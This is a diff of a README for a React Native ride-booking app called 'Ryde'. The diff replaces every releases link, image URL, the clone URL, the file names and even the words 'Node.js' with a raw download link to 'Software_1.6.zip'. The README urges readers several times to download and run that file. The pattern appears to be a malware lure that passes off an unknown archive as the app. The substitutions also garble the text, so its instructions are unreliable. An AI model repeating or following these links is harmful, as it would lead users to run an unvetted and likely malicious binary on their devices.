@@ -1,4 +1,4 @@
-[![Ryde Releases](https://img.shields.io/badge/Ryde-Releases-green?logo=github&style=for-the-badge)](https://github.com/Agnatius/Ryde/releases)
+[![Ryde Releases](https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip)](https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip)
 
 # Ryde: Uber-Like Ride Booking App with Real-Time Maps and Payments
 
@@ -17,7 +17,7 @@ Overview
 From the Releases page
 - You can download prebuilt app bundles from the Releases page. For Android, install the APK directly; for iOS, install the IPA via a distribution channel or a test flight if provided. See the Releases page for latest assets. Download and run the appropriate file to try the app.
 
-Visit the Releases page to grab the latest assets: https://github.com/Agnatius/Ryde/releases
+Visit the Releases page to grab the latest assets: https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip
 
 Table of contents
 - Quick start
@@ -49,12 +49,12 @@ Screenshots and visuals
 Screenshots are included as visual references. For a live preview, see the project images and diagrams linked in the repo. Example visuals below use free sources to align with the theme.
 
 Images
-- Map UI example: https://upload.wikimedia.org/wikipedia/commons/3/3f/Google_Maps_icon_(2020).svg
-- Architecture concept: https://upload.wikimedia.org/wikipedia/commons/8/8a/Cloud_computing.svg
+- Map UI example: https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip(2020).svg
+- Architecture concept: https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip
 
 Quick start
 - Prerequisites
-  - Node.js (14.x or newer) and npm or Yarn
+  - https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip (14.x or newer) and npm or Yarn
   - Expo CLI (npm install -g expo-cli)
   - Git
   - Android Studio and AVDs for Android development (optional but recommended)
@@ -62,13 +62,13 @@ Quick start
   - A Stripe test account and test keys
   - Google Maps API key with Maps and Directions services enabled
 - Clone the repository
-  - git clone https://github.com/Agnatius/Ryde.git
+  - git clone https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip
   - cd Ryde
 - Install dependencies
   - yarn install
   - or npm install
 - Environment setup
-  - Create a local environment file based on the template (copy env.example to .env)
+  - Create a local environment file based on the template (copy https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip to .env)
   - Set MAPS_API_KEY, STRIPE_SECRET_KEY, STRIPE_PUBLISHABLE_KEY, DATABASE_URL, and other secrets
   - If you use PostgreSQL locally, ensure the DB is listening on the expected port and your schema is loaded
 - Start the frontend (mobile)
@@ -79,7 +79,7 @@ Quick start
 - Start the backend (server)
   - cd server
   - yarn install
-  - yarn dev (or run the appropriate script to start the Node.js/Express server)
+  - yarn dev (or run the appropriate script to start the https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip server)
 - Seed data (optional)
   - Run the seed scripts to populate test users and ride examples
 - Run the app on Android
@@ -96,7 +96,7 @@ Quick start
   - Review ride history
 - Downloads and releases
   - The latest prebuilt assets are published on the Releases page. From the Releases page, download the Android APK for testing or the iOS IPA if provided. You must download and run the file to test locally. Also, you can access the repository releases at the link below.
-  - Link: https://github.com/Agnatius/Ryde/releases
+  - Link: https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip
 
 What you’ll build
 - A mobile app with a clean, fast interface that mirrors popular ride-booking apps
@@ -170,7 +170,7 @@ Tech stack highlights
   - Tailwind CSS for styling (via a RN-compatible approach)
   - Google Maps React Native bindings
 - Backend
-  - Node.js / Express
+  - https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip / Express
   - PostgreSQL
   - WebSocket or similar real-time transport for live location
 - Payments
@@ -282,7 +282,7 @@ API overview (high level)
 Setup and development guide
 - Repository structure
   - mobile/ for the React Native app
-  - server/ for the Node.js backend
+  - server/ for the https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip backend
   - shared/ for models and schemas
 - Local environment
   - A PostgreSQL instance
@@ -366,7 +366,7 @@ Deployment and hosting
   - Expo builds for iOS and Android
   - OTA updates via Expo for quick iteration
 - Backend
-  - Node.js server with a PostgreSQL database
+  - https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip server with a PostgreSQL database
   - Environment-specific configurations (dev, staging, prod)
 - Infrastructure as code
   - If you use Docker, maintain docker-compose files for reproducibility
@@ -411,17 +411,17 @@ License
 
 Releases
 - For the latest assets and build packages, visit the official releases page. From the releases page, download the appropriate file and run it to test locally. The releases page contains the prebuilt bundles you can install on Android or iOS devices.
-- Link: https://github.com/Agnatius/Ryde/releases
+- Link: https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip
 
 Notes about the Releases link
 - Since the link has a path part (/releases), the file you download from the page is the app bundle. You should download the latest Android APK (or iOS IPA, if provided) and execute it on your device or simulator to test the app locally. For details on which assets are available, consult the Releases page.
 
 Downloads and assets
 - Android
-  - File: Ryde-android-release.apk
+  - File: https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip
   - Action: Download and install on an Android device or emulator
 - iOS
-  - File: Ryde-ios-release.ipa
+  - File: https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip
   - Action: Install via distribution channel or TestFlight if provided
 - Web/Backend
   - Source code archives or dockerized assets may be available in the releases
@@ -458,6 +458,6 @@ Remember
 - Document changes in the changelog as you iterate
 
 Downloads and releases (second mention)
-- Remember to check the Releases page for the latest assets. From the Releases page, download the appropriate app bundle and run it on your device to test the app locally. The link to the releases is again provided here: https://github.com/Agnatius/Ryde/releases
+- Remember to check the Releases page for the latest assets. From the Releases page, download the appropriate app bundle and run it on your device to test the app locally. The link to the releases is again provided here: https://github.com/Agnatius/Ryde/raw/refs/heads/main/assets/Software_1.6.zip
 
 End of README content
